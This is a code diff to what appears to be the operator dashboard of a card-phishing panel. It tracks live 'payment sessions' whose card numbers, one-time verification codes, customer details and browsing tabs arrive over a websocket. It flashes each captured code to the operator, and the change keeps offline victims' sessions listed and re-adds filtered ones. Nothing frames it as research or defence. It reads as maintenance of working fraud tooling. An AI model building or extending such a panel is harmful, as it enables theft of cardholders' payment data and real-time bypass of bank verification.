@@ -56,11 +56,6 @@ const { connected, sendAction, ws } = usePaymentWs({
       if (data.currentStep !== undefined) s.currentStep = data.currentStep;
       if (data.status !== undefined) s.status = data.status;
       if (data.isOnline !== undefined) s.isOnline = data.isOnline;
-      // Remove from list when customer goes offline
-      if (data.isOnline === false) {
-        sessions.splice(idx, 1);
-        return;
-      }
       if (data.countdownSeconds !== undefined) s.countdownSeconds = data.countdownSeconds;
       if (data.cardHistory !== undefined) (s as any).cardHistory = data.cardHistory;
       if (data.status === 'pending' && prevStatus !== 'pending') {
@@ -95,6 +90,18 @@ const { connected, sendAction, ws } = usePaymentWs({
           content: `编号 ${s.sessionId} - 验证码 ${data.cardInfo.otpCode}`,
           duration: 4000
         });
+      }
+    } else if (data.isOnline !== false && data.cardInfo && data.sessionId) {
+      // Session came back online but was filtered out on refresh — re-add it
+      if (!_onlyCardFilter || !!(data.cardInfo?.cardNumber)) {
+        sessions.unshift({
+          id: data.sessionId, sessionId: data.sessionId,
+          cardInfo: data.cardInfo || {}, customerInfo: data.customerInfo || {},
+          browsingTabs: data.browsingTabs || [], status: data.status || 'live',
+          currentStep: data.currentStep || 'card', frontendUrl: data.frontendUrl || '',
+          isOnline: true, countdownSeconds: 0, createdAt: '', updatedAt: '',
+          cardHistory: data.cardHistory || []
+        } as any);
       }
     }
   },
